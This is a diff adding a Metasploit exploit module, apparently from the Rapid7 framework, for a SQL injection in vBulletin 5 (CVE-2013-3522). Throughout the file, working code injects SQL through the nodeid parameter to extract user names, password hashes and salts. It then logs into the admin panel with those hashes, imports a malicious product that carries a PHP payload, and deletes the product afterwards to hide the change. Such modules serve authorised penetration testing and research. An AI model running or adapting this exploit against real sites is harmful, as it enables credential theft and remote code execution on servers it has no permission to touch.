@@ -1,0 +1,458 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection',
+      'Description'    => %q{
+        This module exploits a SQL injection vulnerability found in vBulletin 5 that has
+        been used in the wild since March 2013. This module uses the sqli to extract the
+        web application's usernames and hashes. With the retrieved information tries to
+        log into the admin control panel in order to deploy the PHP payload. This module
+        has been tested successfully on VBulletin Version 5.0.0 Beta 13 over an Ubuntu
+        Linux distribution.
+      },
+      'Author'         =>
+        [
+          'Orestis Kourides', # Vulnerability discovery and PoC
+          'juan vazquez' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2013-3522' ],
+          [ 'OSVDB', '92031' ],
+          [ 'EDB', '24882' ],
+          [ 'BID', '58754' ],
+          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
+        ],
+      'Privileged'     => false, # web server context
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'Space'       => 10000 # Just value big enough to fit any php payload
+        },
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [[ 'vBulletin 5.0.0 Beta 11-28', { }]],
+      'DisclosureDate' => 'Mar 25 2013',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new("TARGETURI", [true, 'The path to vBulletin', '/']),
+        OptInt.new("NODE", [false, 'Valid Node ID']),
+        OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
+        OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
+      ], self.class)
+  end
+
+  def exists_node?(id)
+    mark = rand_text_alpha(8 + rand(5))
+    result = do_sqli(id, "select '#{mark}'")
+
+    if result and result =~ /#{mark}/
+      return true
+    end
+
+    return false
+  end
+
+  def brute_force_node
+    min = datastore["MINNODE"]
+    max = datastore["MAXNODE"]
+
+    if min > max
+      print_error("#{peer} - MINNODE can't be major than MAXNODE")
+      return nil
+    end
+
+    for node_id in min..max
+      if exists_node?(node_id)
+        return node_id
+      end
+    end
+
+    return nil
+  end
+
+  def get_node
+    if datastore['NODE'].nil? or datastore['NODE'] <= 0
+      print_status("#{peer} - Brute forcing to find a valid node id...")
+      return brute_force_node
+    end
+
+    print_status("#{peer} - Checking node id #{datastore['NODE']}...")
+    if exists_node?(datastore['NODE'])
+      return datastore['NODE']
+    else
+      return nil
+    end
+  end
+
+  def do_sqli(node, query)
+    mark = Rex::Text.rand_text_alpha(5 + rand(3))
+    random_and = Rex::Text.rand_text_numeric(4)
+    injection = ") and(select 1 from(select count(*),concat((select (select concat('#{mark}',cast((#{query}) as char),'#{mark}')) "
+    injection << "from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) "
+    injection << "AND (#{random_and}=#{random_and}"
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
+      'vars_post' =>
+        {
+          'nodeid'  => "#{node}#{injection}",
+        }
+      })
+
+    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/
+      return nil
+    end
+
+    data = ""
+
+    if res.body.to_s =~ /#{mark}(.*)#{mark}/
+      data = $1
+    end
+
+    return data
+  end
+
+  def get_user_data(node_id, user_id)
+    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id+1}")
+    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id+1}")
+    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id+1}")
+
+    return [user, pass, salt]
+  end
+
+  def do_login(user, hash)
+    res = send_request_cgi({
+      'uri'           => normalize_uri(target_uri.path, "login.php"),
+      'method'        => 'POST',
+      'encode_params' => false,
+      'vars_get'      => {
+        'do' => 'login'
+      },
+      'vars_post'     => {
+        'url'                      => '%2Fadmincp%2F',
+        'securitytoken'            => 'guest',
+        'logintype'                => 'cplogin',
+        'do'                       => 'login',
+        'vb_login_md5password'     => hash,
+        'vb_login_md5password_utf' => hash,
+        'vb_login_username'        => user,
+        'vb_login_password'        => '',
+        'cssprefs'                 => ''
+      }
+    })
+
+    if res and res.code == 200 and res.body and res.body.to_s =~ /window\.location.*admincp/ and res.headers['Set-Cookie']
+      session = res.get_cookies
+    else
+      return nil
+    end
+
+    res = send_request_cgi({
+      'uri'    => normalize_uri(target_uri.path, "admincp", "/"),
+      'cookie' => session
+    })
+
+    if res and res.code == 200 and res.body and res.body.to_s =~ /<title>Forums Admin Control Panel<\/title>/
+      return session
+    else
+      return nil
+    end
+
+  end
+
+  def get_token(response)
+    token_info = {
+      :session_hash => "",
+      :security_token => "",
+      :admin_hash => ""
+    }
+
+    if response =~ /var SESSIONHASH = "([0-9a-f]+)";/
+      token_info[:session_hash] = $1
+    end
+
+    if response =~ /var ADMINHASH = "([0-9a-f]+)";/
+      token_info[:admin_hash] = $1
+    end
+
+    if response =~ /var SECURITYTOKEN = "([0-9a-f\-]+)";/
+      token_info[:security_token] = $1
+    end
+
+    return token_info
+  end
+
+  def get_install_token
+    res = send_request_cgi({
+      "uri"      => normalize_uri(target_uri.path, "admincp", "product.php"),
+      "vars_get" => {
+        "do" => "productadd"
+      },
+      "cookie"   => @session
+    })
+
+    unless res and res.code == 200 and res.body.to_s =~ /SECURITYTOKEN/
+      return nil
+    end
+
+
+    return get_token(res.body.to_s)
+  end
+
+  def install_product(token_info)
+
+    xml_product = <<-EOF
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<product productid="#{@product_id}" active="0">
+  <title>#{@product_id}</title>
+  <description>#{@product_id}</description>
+  <version>1.0</version>
+  <url>http://#{@product_id}.loc</url>
+  <versioncheckurl>http://#{@product_id}.loc/version.xml</versioncheckurl>
+  <dependencies>
+    <dependency dependencytype="vbulletin" minversion="" maxversion="" />
+  </dependencies>
+  <codes>
+    <code version="*">
+      <installcode>
+        <![CDATA[
+        #{payload.encoded}
+        ]]>
+      </installcode>
+      <uninstallcode />
+    </code>
+  </codes>
+  <templates>
+  </templates>
+  <stylevardfns>
+  </stylevardfns>
+  <stylevars>
+  </stylevars>
+  <hooks>
+  </hooks>
+  <phrases>
+  </phrases>
+  <options>
+  </options>
+  <helptopics>
+  </helptopics>
+  <cronentries>
+  </cronentries>
+  <faqentries>
+  </faqentries>
+  <widgets>
+  </widgets>
+</product>
+    EOF
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(token_info[:session_hash], nil, nil, "form-data; name=\"s\"")
+    post_data.add_part("productimport", nil, nil, "form-data; name=\"do\"")
+    post_data.add_part(token_info[:admin_hash], nil, nil, "form-data; name=\"adminhash\"")
+    post_data.add_part(token_info[:security_token], nil, nil, "form-data; name=\"securitytoken\"")
+    post_data.add_part(xml_product, "text/xml", nil, "form-data; name=\"productfile\"; filename=\"product_juan2.xml\"")
+    post_data.add_part("", nil, nil, "form-data; name=\"serverfile\"")
+    post_data.add_part("1", nil, nil, "form-data; name=\"allowoverwrite\"")
+    post_data.add_part("999999999", nil, nil, "form-data; name=\"MAX_FILE_SIZE\"")
+
+    # Work around an incompatible MIME implementation
+    data = post_data.to_s
+    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")
+
+    res = send_request_cgi({
+      'uri'      => normalize_uri(target_uri.path, "admincp", "product.php"),
+      'method'   => "POST",
+      'ctype'    => "multipart/form-data; boundary=#{post_data.bound}",
+      'cookie'   => @session,
+      'vars_get' => {
+        "do" => "productimport"
+      },
+      'data'     => data
+    })
+
+    if res and res.code == 200 and res.body and res.body.to_s =~ /Product #{@product_id} Imported/
+      return true
+    elsif res
+      fail_with(Failure::Unknown, "#{peer} - Error when trying to install the product.")
+    else
+      return false
+    end
+
+  end
+
+  def get_delete_token
+    res = send_request_cgi({
+      'uri'      => normalize_uri(target_uri.path, "admincp", "product.php"),
+      'cookie'   => @session,
+      'vars_get' => {
+        "do" => "productdelete",
+        "productid" => @product_id,
+        "s" => @session_hash
+      }
+    })
+
+    if res and res.code == 200 and res.body.to_s =~ /SECURITYTOKEN/
+      return get_token(res.body.to_s)
+    end
+
+    return nil
+  end
+
+  def delete_product(token_info)
+    res = send_request_cgi({
+      'uri'      => normalize_uri(target_uri.path, "admincp", "product.php"),
+      'method'   => "POST",
+      'cookie'   => @session,
+      'vars_get' => {
+        "do" => "productkill"
+      },
+      'vars_post' => {
+        "s"             => token_info[:session_hash],
+        "do"            => "productkill",
+        "adminhash"     => token_info[:admin_hash],
+        "securitytoken" => token_info[:security_token],
+        "productid"     => @product_id
+      }
+    })
+
+    if res and res.code == 200 and res.body.to_s =~ /Product #{@product_id} Uninstalled/
+      return true
+    end
+
+    return false
+  end
+
+  def check
+    node_id = get_node
+
+    unless node_id.nil?
+      return Msf::Exploit::CheckCode::Vulnerable
+    end
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, "index.php")
+    })
+
+    if res and res.code == 200 and res.body.to_s =~ /"simpleversion": "v=5/
+      return Msf::Exploit::CheckCode::Detected
+    end
+
+    return Msf::Exploit::CheckCode::Unknown
+  end
+
+  def on_new_session(session)
+    print_status("#{peer} - Getting the uninstall token info...")
+    delete_token = get_delete_token
+    if delete_token.nil?
+      print_error("#{peer} - Failed to get the uninstall token, the product #{@product_id} should be uninstalled manually...")
+      return
+    end
+
+    print_status("#{peer} - Deleting the product #{@product_id}...")
+    if delete_product(delete_token)
+      print_good("#{peer} - Product #{@product_id} deleted")
+    else
+      print_error("#{peer} - Failed uninstall the product #{@product_id}, should be done manually...")
+    end
+  end
+
+  def exploit
+    print_status("#{peer} - Checking for a valid node id...")
+    node_id = get_node
+    if node_id.nil?
+      print_error("#{peer} - node id not found")
+      return
+    end
+
+    print_good("#{peer} - Using node id #{node_id} to exploit sqli... Counting users...")
+    data = do_sqli(node_id, "select count(*) from user")
+    if data.empty?
+      print_error("#{peer} - Error exploiting sqli")
+      return
+    end
+    count_users = data.to_i
+    users = []
+    print_good("#{peer} - #{count_users} users found")
+
+    for i in 0..count_users - 1
+      user = get_user_data(node_id, i)
+      report_auth_info({
+        :host => rhost,
+        :port => rport,
+        :user => user[0],
+        :pass => user[1],
+        :type => "hash",
+        :sname => (ssl ? "https" : "http"),
+        :proof => "salt: #{user[2]}" # Using proof to store the hash salt
+      })
+      users << user
+    end
+
+    @session = nil
+    users.each do |user|
+      print_status("#{peer} - Trying to log into vBulletin admin control panel as #{user[0]}...")
+      @session = do_login(user[0], user[1])
+      unless @session.blank?
+        print_good("#{peer} - Logged in successfully as #{user[0]}")
+        break
+      end
+    end
+
+    if @session.blank?
+      fail_with(Failure::NoAccess, "#{peer} - Failed to log into the vBulletin admin control panel")
+    end
+
+    print_status("#{peer} - Getting the install product security token...")
+    install_token = get_install_token
+    if install_token.nil?
+      fail_with(Failure::Unknown, "#{peer} - Failed to get the install token")
+    end
+
+    @session_hash = install_token[:session_hash]
+    @product_id = rand_text_alpha_lower(5 + rand(8))
+    print_status("#{peer} - Installing the malicious product #{@product_id}...")
+    if install_product(install_token)
+      print_good("#{peer} - Product successfully installed... payload should be executed...")
+    else
+      # Two situations trigger this path:
+      # 1) Upload failed but there wasn't answer from the server. I don't think it's going to happen often.
+      # 2) New session, for exemple when using php/meterpreter/reverse_tcp, the common situation.
+      # Because of that fail_with isn't used here.
+      return
+    end
+
+    print_status("#{peer} - Getting the uninstall token info...")
+    delete_token = get_delete_token
+    if delete_token.nil?
+      print_error("#{peer} - Failed to get the uninstall token, the product #{@product_id} should be uninstalled manually...")
+      return
+    end
+
+    print_status("#{peer} - Deleting the product #{@product_id}...")
+    if delete_product(delete_token)
+      print_good("#{peer} - Product #{@product_id} deleted")
+    else
+      print_error("#{peer} - Failed uninstall the product #{@product_id}, should be done manually...")
+    end
+
+  end
+
+
+end
